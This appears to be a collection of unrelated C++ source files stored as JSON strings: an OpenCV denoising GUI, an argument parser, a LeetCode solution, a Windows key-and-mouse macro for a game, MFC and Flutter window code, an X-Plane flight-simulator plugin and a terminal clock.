    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <QFileDialog>\n#include <vector>\n#include<math.h>\nusing namespace cv;\nusing namespace std;\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n\n// \u6784\u5efa\u79ef\u5206\u56fe\uff0c\u7528\u4e8e\u5feb\u901f\u8ba1\u7b97\u56fe\u50cf\u5757\u7684\u5e73\u65b9\u548c\nMat computeIntegralImage(const Mat& img) {\n    Mat integralImg;\n    integral(img, integralImg, CV_64F); // \u8ba1\u7b97\u79ef\u5206\u56fe\uff0cCV_64F\u652f\u6301\u9ad8\u7cbe\u5ea6\n    return integralImg;\n}\n\n// \u5229\u7528\u79ef\u5206\u56fe\u5feb\u901f\u8ba1\u7b97\u56fe\u50cf\u5757\u7684\u5e73\u65b9\u548c\ndouble computeBlockSum(const Mat& integralImg, int x, int y, int blockSize) {\n    int halfBlockSize = blockSize / 2;\n\n    // \u786e\u4fdd\u7d22\u5f15\u4e0d\u8d8a\u754c\n    int x1 = max(x - halfBlockSize, 0);\n    int y1 = max(y - halfBlockSize, 0);\n    int x2 = min(x + halfBlockSize, integralImg.cols - 2); // \u6ce8\u610f\u79ef\u5206\u56fe\u6709\u4e00\u5217\u6269\u5c55\n    int y2 = min(y + halfBlockSize, integralImg.rows - 2);\n\n    double A = integralImg.at<double>(y1, x1);\n    double B = integralImg.at<double>(y1, x2 + 1);\n    double C = integralImg.at<double>(y2 + 1, x1);\n    double D = integralImg.at<double>(y2 + 1, x2 + 1);\n\n    return max(0.0, D - B - C + A);\n}\n\n// \u975e\u5c40\u90e8\u5747\u503c\u6ee4\u6ce2\uff08\u57fa\u4e8e\u79ef\u5206\u56fe\u4f18\u5316\uff09\nMat nonLocalMeansFilterOptimized(const Mat& img, int blockSize, int searchSize, double h) {\n    Mat result = Mat::zeros(img.size(), img.type());\n    Mat integralImg = computeIntegralImage(img); // \u6784\u5efa\u79ef\u5206\u56fe\n    int halfSearchSize = searchSize / 2;\n\n    for (int y = 0; y < img.rows; ++y) {\n        for (int x = 0; x < img.cols; ++x) {\n            double weightSum = 0.0;\n            double intensitySum = 0.0;\n\n            for (int dy = -halfSearchSize; dy <= halfSearchSize; ++dy) {\n                for (int dx = -halfSearchSize; dx <= halfSearchSize; ++dx) {\n                    int neighborX = x + dx, neighborY = y + dy;\n\n                    // \u786e\u4fdd\u90bb\u57df\u4e0d\u8d8a\u754c\n                    if (neighborX >= 0 && neighborX < img.cols && neighborY >= 0 && neighborY < img.rows) {\n                        // \u4f7f\u7528\u79ef\u5206\u56fe\u5feb\u901f\u8ba1\u7b97\u56fe\u50cf\u5757\u7684\u5e73\u65b9\u548c\n                        double blockSum1 = computeBlockSum(integralImg, x, y, blockSize);\n                        double blockSum2 = computeBlockSum(integralImg, neighborX, neighborY, blockSize);\n\n                        // \u8ba1\u7b97\u4e24\u4e2a\u5757\u7684\u8ddd\u79bb\n                        double distance = abs(blockSum1 - blockSum2);\n                        double weight = exp(-distance / (h * h));\n\n                        intensitySum += weight * img.at<uchar>(neighborY, neighborX);\n                        weightSum += weight;\n                    }\n                }\n            }\n            result.at<uchar>(y, x) = cvRound(intensitySum / weightSum);\n        }\n    }\n    return result;\n}\n\n//\u8f93\u5165\u56fe\u7247\nvoid MainWindow::on_btn_LoadImage_clicked()\n{\n    QString imageFilePath = QFileDialog::getOpenFileName(this,tr(\"\u6253\u5f00\u56fe\u7247\"),\"D:/AAAA/data\",\"(\u6240\u6709\u56fe\u50cf(*.jpg *.png *.bmp))\");\n    if (imageFilePath.isEmpty())\n    {\n        return;\n    }\n    srcImage = imread(imageFilePath.toStdString());\n    cvtColor(srcImage,srcImage,CV_BGR2RGB);\n    QImage displayImg = QImage(srcImage.data,srcImage.cols,srcImage.rows,srcImage.cols * srcImage.channels(),QImage::Format_RGB888);\n    QImage disimage = imageCenter(displayImg, ui->lbl_show1);\n    ui->lbl_show1->setPixmap(QPixmap::fromImage(disimage));\n}\n\n//\u56fe\u7247\u5c45\u4e2d\nQImage MainWindow::imageCenter(QImage qimage,QLabel *qLabel)\n{\n    QImage image;\n    QSize imageSize = qimage.size();\n    QSize labelSize = qLabel->size();\n    double dWidthRation = 1.0*imageSize.width()/labelSize.width();\n    double dHeightRatio = 1.0*imageSize.height()/labelSize.height();\n    if(dWidthRation>dHeightRatio)\n    {\n        image = qimage.scaledToWidth(labelSize.width());\n    }else{\n        image = qimage.scaledToHeight(labelSize.height());\n    }\n    return image;\n\n}\n\n\n\nvoid MainWindow::on_btn_OupImage_clicked()\n{\n    Mat find_gray;\n    // \u56fe\u7247\u8f6c\u7070\u5ea6\u56fe\n    cvtColor(srcImage, find_gray, COLOR_BGR2GRAY);\n    Mat gray;\n    //\u5224\u65ad\u901a\u9053\n    int r = srcImage.channels();\n    //\u56fe\u50cf\u7684\u884c\u5217\u6570\n    int row = srcImage.rows;\n    int col = srcImage.cols;\n//    cout << \"row=\" << row << \"col=\" << col << endl;\n    Mat img1;\n    float kk = 1;\n    //\u6839\u636e\u539f\u59cb\u56fe\u50cf\u7684\u5c3a\u5bf8\u52a8\u6001\u8c03\u6574\u56fe\u50cf\u7684\u5927\u5c0f\uff0c\n    //\u4f7f\u5f97\u5904\u7406\u540e\u7684\u56fe\u50cf\u957f\u548c\u5bbd\u5747\u5904\u4e8e1000\u52301500\u50cf\u7d20\u4e4b\u95f4\n    if (row > 5000 || col > 5000) {\n        kk = 4.5;\n    }\n    else if (row > 3000 || col > 3000) {\n        kk = 3;\n    }\n    else if (row > 2000 || col > 2000) {\n        kk = 2;\n    }\n    else if (row > 1000 || col > 1000) {\n        kk = 1.5;\n    }\n//    cout << \"kk=\" << kk << endl;\n    //\u88c1\u526a\u56fe\u7247\uff0c\u964d\u4f4e\u5206\u8fa8\u7387\n    cv::resize(srcImage, img1, Size(round(col / kk), round(row / kk)));\n    Mat img2 = img1.clone();\n    int row1 = img1.rows;\n    int col1 = img1.cols;\n    if (r > 1) {\n        cvtColor(img1, gray, COLOR_BGR2GRAY);\n    }\n    else {\n        gray = img1.clone();\n    }\n    //1. \u51cf\u5c0f\u5206\u8fa8\u7387\uff0c \u53cc\u7ebf\u6027\u5dee\u503c\u7b97\u6cd5\n    cv::resize(gray, gray, Size(round(col / kk), round(row / kk)));\n    //2. \u975e\u5c40\u90e8\u5747\u503c\u6ee4\u6ce2\n    // \u8bbe\u7f6e\u53c2\u6570\n    int blockSize = 5;     // \u56fe\u50cf\u5757\u5927\u5c0f\n    int searchSize = 15;   // \u641c\u7d22\u7a97\u53e3\u5927\u5c0f\n    double h = 15.0;       // \u5e73\u6ed1\u53c2\u6570\n\n    // \u8ba1\u65f6\n    double t = (double)getTickCount();\n\n    // \u6267\u884c\u975e\u5c40\u90e8\u5747\u503c\u6ee4\u6ce2\uff08\u4f18\u5316\u7248\uff09\n    Mat denoisedImg = nonLocalMeansFilterOpti",
    "#include \"Parameters.h\"\n\n#include \"argparse/argparse.hpp\"\n\nnamespace {\nvoid config_argparse(argparse::ArgumentParser &cli) {\n    // Config the arguments to be received\n    cli.add_argument(\"instance\").help(\"instance path\");\n\n    cli.add_argument(\"-s\", \"--seed\").help(\"set random number generator seed\").metavar(\"SEED\").scan<'i', size_t>();\n\n    cli.add_argument(\"-v\", \"--verbose\").help(\"set program verbosity\").metavar(\"VERBOSE\").default_value(false).flag();\n\n    cli.add_argument(\"-r\", \"--ro\")\n        .help(\"set the ro parameter which delimits the time limit of the program\")\n        .metavar(\"RO\")\n        .default_value(size_t(30))\n        .scan<'i', size_t>();\n\n    cli.add_argument(\"-a\", \"--alpha\")\n        .help(\"set the alpha parameter\")\n        .metavar(\"ALPHA\")\n        .default_value(0.6)\n        .scan<'f', double>();\n\n    cli.add_argument(\"-d\", \"--destroy\")\n        .help(\"set the d parameter the number of nodes to remove with in a destroy\")\n        .metavar(\"DESTROY\")\n        .default_value(size_t(5))\n        .scan<'i', size_t>();\n}\n} // namespace\n\nParameters::Parameters(int argc, char **argv) {\n\n    argparse::ArgumentParser cli(\"template\", \"1.0\", argparse::default_arguments::help);\n\n    config_argparse(cli);\n\n    // Parse arguments\n    try {\n        cli.parse_args(argc, argv);\n    } catch (const std::runtime_error &err) {\n        std::cout << err.what() << '\\n';\n        std::cout << cli;\n        exit(EXIT_FAILURE);\n    }\n\n    // Set members\n    m_instance_path = cli.get<std::string>(\"instance\");\n    m_verbose = cli.get<bool>(\"--verbose\");\n    m_seed = cli.present<size_t>(\"--seed\");\n    m_ro = cli.get<size_t>(\"--ro\");\n    m_alpha = cli.get<double>(\"--alpha\");\n    m_d = cli.get<size_t>(\"--destroy\");\n}\n",
    "class Solution {\npublic:\n    typedef pair<int, pair<int, int>> pp;\n    vector<vector<int>> directions = {{0, -1}, {0, 1}, {-1, 0}, {1, 0}};\n\n    int trapRainWater(vector<vector<int>>& heightmap) {\n        if (heightmap.empty() || heightmap[0].empty()) return 0;\n\n        int n = heightmap.size();\n        int m = heightmap[0].size();\n\n        priority_queue<pp, vector<pp>, greater<pp>> boundarycells;\n        vector<vector<bool>> visited(n, vector<bool>(m, false));\n\n        // Add all boundary cells to the priority queue\n        for (int i = 0; i < n; ++i) {\n            for (int j : {0, m - 1}) {\n                boundarycells.push({heightmap[i][j], {i, j}});\n                visited[i][j] = true;\n            }\n        }\n        for (int j = 0; j < m; ++j) {\n            for (int i : {0, n - 1}) {\n                if (!visited[i][j]) {\n                    boundarycells.push({heightmap[i][j], {i, j}});\n                    visited[i][j] = true;\n                }\n            }\n        }\n\n        int water = 0;\n\n        while (!boundarycells.empty()) {\n            pp current = boundarycells.top();\n            boundarycells.pop();\n\n            int height = current.first;\n            int x = current.second.first;\n            int y = current.second.second;\n\n            for (vector<int>& dir : directions) {\n                int nx = x + dir[0];\n                int ny = y + dir[1];\n\n                if (nx >= 0 && nx < n && ny >= 0 && ny < m && !visited[nx][ny]) {\n                    water += max(0, height - heightmap[nx][ny]);\n                    boundarycells.push({max(height, heightmap[nx][ny]), {nx, ny}});\n                    visited[nx][ny] = true;\n                }\n            }\n        }\n\n        return water;\n    }\n};\n",
    "#include <Windows.h>\n#include <iostream>\n#include <ctime>\n#include <thread>\n\n//kept it as barebone and simple as possible, maybe I will update it in the future to offer more features :) \n\nvoid moveMouse(int x, int y, int smoothnessCoefficient) {\n    x /= smoothnessCoefficient;\n    y /= smoothnessCoefficient;\n    for (int i = 0; i < smoothnessCoefficient; i++) {\n        mouse_event(MOUSEEVENTF_MOVE, x, y, 0, 0);\n        std::this_thread::sleep_for(std::chrono::milliseconds(5));\n    }\n}\n\nvoid pressKey(WORD key) {\n    INPUT ip = { };\n    ip.type = INPUT_KEYBOARD;\n    ip.ki.wVk = key;\n    ip.ki.dwFlags = 0;\n    SendInput(1, &ip, sizeof(ip));\n    std::this_thread::sleep_for(std::chrono::milliseconds(30));\n    ip.ki.dwFlags = KEYEVENTF_KEYUP;\n    SendInput(1, &ip, sizeof(ip));\n}\n\nvoid pressMouseLeft() {\n    INPUT ip = { };\n    ip.type = INPUT_MOUSE;\n    ip.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;\n    SendInput(1, &ip, sizeof(ip));\n    std::this_thread::sleep_for(std::chrono::milliseconds(10));\n    ip.mi.dwFlags = MOUSEEVENTF_LEFTUP;\n    SendInput(1, &ip, sizeof(ip));\n}\n\nvoid pressMouseRight() {\n    INPUT ip = { };\n    ip.type = INPUT_MOUSE;\n    ip.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;\n    SendInput(1, &ip, sizeof(ip));\n    std::this_thread::sleep_for(std::chrono::milliseconds(50));\n    ip.mi.dwFlags = MOUSEEVENTF_RIGHTUP;\n    SendInput(1, &ip, sizeof(ip));\n}\n\nint main()\n{\n    //CHANGE THIS TO YOUR PREFERENCE\n    WORD CrystalHotbarKey = 0x31;\n    WORD ObbyHotbarKey = 0x32;\n    WORD SwordHotbarKey = 0x33;\n\n    WORD EndProgramKey = VK_INSERT;\n    WORD AutoCrystalKey = VK_XBUTTON1;\n\n    std::srand(std::time(0));\n    int delay = 5 + std::rand() % 14;\n    int placeBlocks = true;\n\n    while (true) {\n        std::this_thread::sleep_for(std::chrono::milliseconds(1));\n\n        if (GetAsyncKeyState(EndProgramKey) & 1) {\n            break;\n        }\n\n        if (GetAsyncKeyState(AutoCrystalKey) < 0 || GetAsyncKeyState(AutoCrystalKey) & 1) {\n            if (placeBlocks == true) {\n                placeBlocks = false;\n\n                pressKey(ObbyHotbarKey);\n                std::this_thread::sleep_for(std::chrono::milliseconds(delay));\n                pressMouseRight();\n                std::this_thread::sleep_for(std::chrono::milliseconds(delay));\n            }\n            \n            pressKey(CrystalHotbarKey);\n            std::this_thread::sleep_for(std::chrono::milliseconds(delay));\n            pressMouseRight();\n            std::this_thread::sleep_for(std::chrono::milliseconds(delay));\n            moveMouse(0, -800, 2);\n            std::this_thread::sleep_for(std::chrono::milliseconds(delay));\n            pressMouseLeft();\n            std::this_thread::sleep_for(std::chrono::milliseconds(delay));\n            moveMouse(0, 800, 2);\n        }\n\n        else if(GetAsyncKeyState(AutoCrystalKey) == 0 && placeBlocks != true){\n            pressKey(SwordHotbarKey);\n            placeBlocks = true;\n            delay = 5 + std::rand() % 14;\n        }\n    }\n    std::cout << \"Bye \\n\";\n    return 0;\n}\n\n",
    "\ufeff#include \"StdAfx.h\"\n#include \"TplDisplayParamPage.h\"\n\n#include \"baseConst.h\"\n#include \"UnitHelper.h\"\n\n#include \"clReportResource.h\"\n#include \"TplDisplayParam.h\"\n\n#include \"Uxtheme.h\"\n#pragma comment(lib, \"Uxtheme.lib\")\n\nBEGIN_CUTLEADER_NAMESPACE()\n\nIMPLEMENT_DYNCREATE(TplDisplayParamPage, CResizableDialog)\n\nTplDisplayParamPage::TplDisplayParamPage(void) : CLResizableDialog(TplDisplayParamPage::IDD)\n{\n\tm_strMsg = MultiLanguageMgr::GetInstance()->TranslateString(IDS_MSG_RPT_DISPLAY_PARAM);\n}\n\nTplDisplayParamPage::~TplDisplayParamPage(void)\n{\n}\n\nvoid TplDisplayParamPage::DoDataExchange(CDataExchange* pDX)\n{\n\tCResizableDialog::DoDataExchange(pDX);\n\n\tDDX_Text(pDX, IDC_EDIT_MSG, m_strMsg);\n\tDDX_Control(pDX, IDC_COMBO_DISPLAY_UNIT, m_ctrlDisplayUnit);\n\n\t// paper margin.\n\tDDX_Check(pDX, IDC_CHECK_SHOW_MARGIN, m_bShowMargin);\n\tDDX_Control(pDX, IDC_PIC_MARGIN_COLOR, m_ctrlMarginColor);\n\n\t// grid.\n\tDDX_Check(pDX, IDC_CHECK_SHOW_GRID, m_bShowGrid);\n\tDDX_Control(pDX, IDC_PIC_GRID_COLOR, m_ctrlGridColor);\n\n\tDDX_Control(pDX, IDC_BTN_MARGIN_COLOR, m_btnMarginColor);\n\tDDX_Control(pDX, IDC_BTN_GRID_COLOR, m_btnGridColor);\n}\n\nBEGIN_MESSAGE_MAP(TplDisplayParamPage, CResizableDialog)\n\tON_WM_CTLCOLOR()\n\n\tON_BN_CLICKED(IDC_BTN_MARGIN_COLOR, OnMarginColor)\n\tON_BN_CLICKED(IDC_BTN_GRID_COLOR, OnGridColor)\nEND_MESSAGE_MAP()\n\nBOOL TplDisplayParamPage::OnInitDialog()\n{\n\tCLResizableDialog::OnInitDialog();\n\n\t/************************************************************************/\n\t// layout controls.\n\n\tAddAnchor(IDC_STATIC_INFO, TOP_LEFT);\n\tAddAnchor(IDC_EDIT_MSG, TOP_LEFT, TOP_RIGHT);\n\n\tAddAnchor(IDC_TEXT_DISPLAY_UNIT, TOP_LEFT);\n\tAddAnchor(IDC_COMBO_DISPLAY_UNIT, TOP_LEFT);\n\n\t// paper margin.\n\tAddAnchor(IDC_GROUP_PAPER_MARGIN, TOP_LEFT, TOP_RIGHT);\n\tAddAnchor(IDC_CHECK_SHOW_MARGIN, TOP_LEFT);\n\tAddAnchor(IDC_TEXT_MARGIN_COLOR, TOP_LEFT);\n\tAddAnchor(IDC_PIC_MARGIN_COLOR, TOP_LEFT);\n\tAddAnchor(IDC_BTN_MARGIN_COLOR, TOP_LEFT);\n\n\t// grid.\n\tAddAnchor(IDC_GROUP_GRID, TOP_LEFT, TOP_RIGHT);\n\tAddAnchor(IDC_CHECK_SHOW_GRID, TOP_LEFT);\n\tAddAnchor(IDC_TEXT_GRID_COLOR, TOP_LEFT);\n\tAddAnchor(IDC_PIC_GRID_COLOR, TOP_LEFT);\n\tAddAnchor(IDC_BTN_GRID_COLOR, TOP_LEFT);\n\t/************************************************************************/\n\n\t/************************************************************************/\n\t// init data.\n\n\t// init the combo box.\n\tCString str;\n\tstr = MultiLanguageMgr::GetInstance()->TranslateString(IDS_TPL_UNIT_PIXEL);\n\tm_ctrlDisplayUnit.AddString(str);\n\tstr = MultiLanguageMgr::GetInstance()->TranslateString(IDS_TPL_UNIT_INCH);\n\tm_ctrlDisplayUnit.AddString(str);\n\tstr = MultiLanguageMgr::GetInstance()->TranslateString(IDS_TPL_UNIT_CM);\n\tm_ctrlDisplayUnit.AddString(str);\n\t/************************************************************************/\n\n\tSetBackgroundColor( SkinManager::GetBackgroundColor() );\n\t\n\tSetWindowTheme( GetDlgItem( IDC_COMBO_DISPLAY_UNIT )->GetSafeHwnd(), L\"\", L\"\" );\n\tSetWindowTheme( GetDlgItem( IDC_GROUP_PAPER_MARGIN )->GetSafeHwnd(), L\"\", L\"\" );\n\tSetWindowTheme( GetDlgItem( IDC_CHECK_SHOW_MARGIN )->GetSafeHwnd(), L\"\", L\"\" );\n\tSetWindowTheme( GetDlgItem( IDC_GROUP_GRID )->GetSafeHwnd(), L\"\", L\"\" );\n\tSetWindowTheme( GetDlgItem( IDC_CHECK_SHOW_GRID )->GetSafeHwnd(), L\"\", L\"\" );\n\n\tUpdateData(FALSE);\n\n\treturn TRUE;\n}\n\nHBRUSH TplDisplayParamPage::OnCtlColor( CDC *pDC, CWnd *pWnd, UINT nCtlColor )\n{\n\treturn SkinManager::GetDialogCtrlColor( pDC, pWnd, nCtlColor );\n}\n\nvoid TplDisplayParamPage::OnMarginColor()\n{\n\tCColorDialog dlg(m_pTplDisplayParam->GetMarginColor());\n\tif (dlg.DoModal() == IDOK)\n\t{\n\t\tm_ctrlMarginColor.SetColor(dlg.GetColor());\n\t}\n}\n\nvoid TplDisplayParamPage::OnGridColor()\n{\n\tCColorDialog dlg(m_pTplDisplayParam->GetGridColor());\n\tif (dlg.DoModal() == IDOK)\n\t{\n\t\tm_ctrlGridColor.SetColor(dlg.GetColor());\n\t}\n}\n\nvoid TplDisplayParamPage::DisplayDisParam(TplDisplayParamPtr pTplDisplayParam)\n{\n\tm_pTplDisplayParam = pTplDisplayParam;\n\n\t// unit type.\n\tif (m_pTplDisplayParam->GetTplUnit() == TPL_UNIT_PIXEL)\n\t\tm_ctrlDisplayUnit.SetCurSel(0);\n\telse if (m_pTplDisplayParam->GetTplUnit() == TPL_UNIT_INCH)\n\t\tm_ctrlDisplayUnit.SetCurSel(1);\n\telse if (m_pTplDisplayParam->GetTplUnit() == TPL_UNIT_CM)\n\t\tm_ctrlDisplayUnit.SetCurSel(2);\n\n\t// paper margin.\n\tm_bShowMargin = m_pTplDisplayParam->IsShowMargin();\n\tm_ctrlMarginColor.SetColor(m_pTplDisplayParam->GetMarginColor());\n\n\t// grid.\n\tm_bShowGrid = m_pTplDisplayParam->IsShowGrid();\n\tm_ctrlGridColor.SetColor(m_pTplDisplayParam->GetGridColor());\n\n\tUpdateData(FALSE);\n}\n\nTplDisplayParamPtr TplDisplayParamPage::GetTplDisplayParam()\n{\n\tUpdateData(TRUE);\n\n\t// display unit.\n\tif (m_ctrlDisplayUnit.GetCurSel() != (int)m_pTplDisplayParam->GetTplUnit())\n\t{\n\t\tm_pTplDisplayParam->SetTplUnit((TPL_UNIT_TYPE)m_ctrlDisplayUnit.GetCurSel());\n\t\tm_pTplDisplayParam->SetModified(TRUE);\n\t}\n\n\t// about paper margin.\n\tif (m_bShowMargin != m_pTplDisplayParam->IsShowMargin())\n\t{\n\t\tm_pTplDisplayParam->IsShowMargin(m_bShowMargin);\n\t\tm_pTplDisplayParam->SetModified(TRUE);\n\t}\n\tif (m_ctrlMarginColor.GetC",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Point.cpp                                          :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: jpaul <jpaul@student.42kl.edu.my>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2025/01/09 16:51:18 by jpaul             #+#    #+#             */\n/*   Updated: 2025/01/09 16:51:18 by jpaul            ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Point.hpp\"\n\nPoint::Point() : x(Fixed(0)), y(Fixed(0)){}\nPoint::Point(const float _x, const float _y) : x(Fixed(_x)), y(Fixed(_y)) {}\nPoint::Point(const Point& other) : x(other.x), y(other.y) {}\nPoint::~Point() {}\n\nPoint& Point::operator=(const Point& other) \n{\n    if (this != &other) \n    {\n        // Since x and y are const, we cannot directly assign \n        // new values to them. \n        // We can't do: \n        // x = other.x; \n        // y = other.y; \n\n        // Since x and y are const, assignment isn't possible; throw error if misused\n        std::cerr << \"Assignment operator cannot modify const members\" << std::endl;\n    }\n    return *this;\n}\n\nfloat Point::getX() const {return x.toFloat();}\nfloat Point::getY() const {return y.toFloat();}\n\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <stdio.h>\n#include <string.h>\n#include <XPLMUtilities.h>\n#include <XPLMMenus.h>\n#include <XPLMProcessing.h>\n#include \"BetaflightData.h\"\n#include \"XPlaneData.h\"\n#include \"XmlSetup.h\"\n\n\nCBetaflightData *betaFlightNet;\nTXPlaneData *simData;\nXPLMFlightLoopID loopId;\n\nPLUGIN_API int XPluginStart(char *\t\toutName,\n\t\t\t\t\t\t\tchar *\t\toutSig,\n\t\t\t\t\t\t\tchar *\t\toutDesc)\n{\n\tstrcpy(outName, \"BetaflightXPlanePlugin\");\n\tstrcpy(outSig, \"SITL.Betaflight.XPlanePlugin\");\n\tstrcpy(outDesc, \"Betaflight SITL <-> X-Plane plugin\");\n\n\treturn true;\n}\n\nPLUGIN_API void\tXPluginStop(void)\n{\n\tbetaFlightNet->Terminate();\n\tXPLMDestroyFlightLoop(loopId);\n\tdelete betaFlightNet;\n\tdelete simData;\n}\n\nPLUGIN_API void XPluginDisable(void)\n{\n}\n\n\nfloat floop_cb(float elapsed1, float elapsed2, int ctr, void* refcon)\n{\n\tbetaFlightNet->RecvData();\n\tsimData->sendServoControlToXPlane();\n\n\tsimData->updateBetaflightControlFromXPlane();\n\tsimData->updateBetaflightStateFromXPlane();\n\tbetaFlightNet->SendData();\n\t\n\treturn -1;\n}\n\n\nvoid menu_handler(void * in_menu_ref, void * in_item_ref)\n{\n\tif (!strcmp((char*)in_item_ref, \"Menu Arm\"))\n\t\tbetaFlightNet->setArm(true);\n\telse if (!strcmp((char*)in_item_ref, \"Menu DisArm\"))\n\t\tbetaFlightNet->setArm(false);\n\telse if (!strcmp((char*)in_item_ref, \"Menu Acro\"))\n\t\tbetaFlightNet->setAcroMode();\n\telse if (!strcmp((char*)in_item_ref, \"Menu Manual\"))\n\t\tbetaFlightNet->setManualMode();\n\telse if (!strcmp((char*)in_item_ref, \"Menu Angle\"))\n\t\tbetaFlightNet->setAngleMode();\n\telse if (!strcmp((char*)in_item_ref, \"Restart SITL\"))\n\t\tbetaFlightNet->Restart();\t\n}\n\nPLUGIN_API int XPluginEnable(void)\n{\n\tCXmlSetup setupData;\n\tbetaFlightNet = new CBetaflightData(setupData);\n\tsimData = new TXPlaneData(betaFlightNet, setupData);\n\n\tbetaFlightNet->Initialize();\n\tsimData->Initialize();\n\n\tXPLMCreateFlightLoop_t params;\n\tparams.structSize = sizeof(XPLMCreateFlightLoop_t);\n\tparams.callbackFunc = &floop_cb;\n\tparams.phase = xplm_FlightLoop_Phase_AfterFlightModel;\n\tparams.refcon = NULL;\n\tloopId = XPLMCreateFlightLoop(&params);\n\tXPLMScheduleFlightLoop(loopId, -1, true);\n\n\tint menu_container_idx = XPLMAppendMenuItem(XPLMFindPluginsMenu(), \"Betaflight\", 0, 0);\n\tXPLMMenuID menu_id = XPLMCreateMenu(\"SITL\", XPLMFindPluginsMenu(), menu_container_idx, menu_handler, NULL);\n\tint arm_id = XPLMAppendMenuItem(menu_id, \"Arm\", (void *)\"Menu Arm\", 1);\n\tint disarm_id = XPLMAppendMenuItem(menu_id, \"DisArm\", (void *)\"Menu DisArm\", 1);\n\tint manual_id = XPLMAppendMenuItem(menu_id, \"Manual\", (void *)\"Menu Manual\", 1);\n\tint acro_id = XPLMAppendMenuItem(menu_id, \"Acro\", (void *)\"Menu Acro\", 1);\n\tint angle_id = XPLMAppendMenuItem(menu_id, \"Angle\", (void *)\"Menu Angle\", 1);\n\tXPLMAppendMenuItem(menu_id, \"Restart SITL\", (void *)\"Restart SITL\", 1);\n\n\tCXmlSetup setup;\n    \n\treturn 1;\n}\n\nPLUGIN_API void XPluginReceiveMessage(\n\t\t\t\t\tXPLMPluginID\tinFromWho,\n\t\t\t\t\tint\t\t\t\tinMessage,\n\t\t\t\t\tvoid *\t\t\tinParam)\n{\n\t\n}\n\n",
    "#include <iostream>\n#include <chrono>\n#include <cmath>\n#include <cstring>\n#include <thread>\n\n#include \"Clock.hpp\"\n#include \"Graphic.hpp\"\n\nconst float map(const float val, const float inMin, const float inMax, const float outMin, const float outMax){\n    return (val - inMin) * (outMax - outMin) / (inMax - inMin) + outMin;\n}\n\nconst char helpMsg[] = \n\"Usage:\\n\\\n    clock [OPTION]...\\n\\\n    clock [OPTION]... [X RESOLUTION] [Y RESOLUTION]\\n\\\n\\n\\\nprint a analog clock based on system time to terminal\\n\\\n\\n\\\nOptions:\\n\\\n -h, --help      this help message\\n\\\n -o, --offset [N] set GTC timezone offset to N (float)\\n\";\n\nconst char argError[] = \"argument error, type \\'-h\\' or \\'--help\\' for help\\n\\n\";\n\nint main(int argc, char** argv){\n    Clock clock;\n    Graphic graphic;\n\n    const int defaultSizeX = 40, defaultSizeY = 20;\n\n    try{\n        if(argc == 2){\n            if(!std::strcmp(argv[1], \"-h\") || !std::strcmp(argv[1], \"--help\")){\n                std::cout << helpMsg;\n                return 0;\n            }\n            else throw std::invalid_argument(\"invalid arguments\");\n        }\n        else if(argc > 2){\n            if(argc == 3 && !std::strcmp(argv[1], \"-o\") || !std::strcmp(argv[1], \"--offset\")){\n                clock.setTimeZone(std::stof(argv[2]));\n                graphic.setScreenSize(defaultSizeX, defaultSizeY); //default\n            }\n            else if(argc == 3){\n                graphic.setScreenSize(std::stoi(argv[1]), std::stoi(argv[2]));\n            }\n            else if(argc == 5 && !std::strcmp(argv[3], \"-o\") || !std::strcmp(argv[3], \"--offset\")){\n                graphic.setScreenSize(std::stoi(argv[1]), std::stoi(argv[2]));\n                clock.setTimeZone(std::stof(argv[4]));\n            }\n            else if(argc == 5){\n                graphic.setScreenSize(std::stoi(argv[3]), std::stoi(argv[4]));\n                clock.setTimeZone(std::stof(argv[2]));\n            }\n            else{\n                throw(std::invalid_argument(\"invalid arguments\"));\n            }\n        }\n        else{\n            graphic.setScreenSize(defaultSizeX, defaultSizeY); //default\n        }\n    }\n    catch(std::invalid_argument badArg){\n        std::cout << argError;\n        throw;\n    }\n\n    for(;;){\n        graphic.drawTime(clock.getTime());\n        graphic.draw();\n        std::this_thread::sleep_for(std::chrono::seconds(1));\n    }\n\n}",
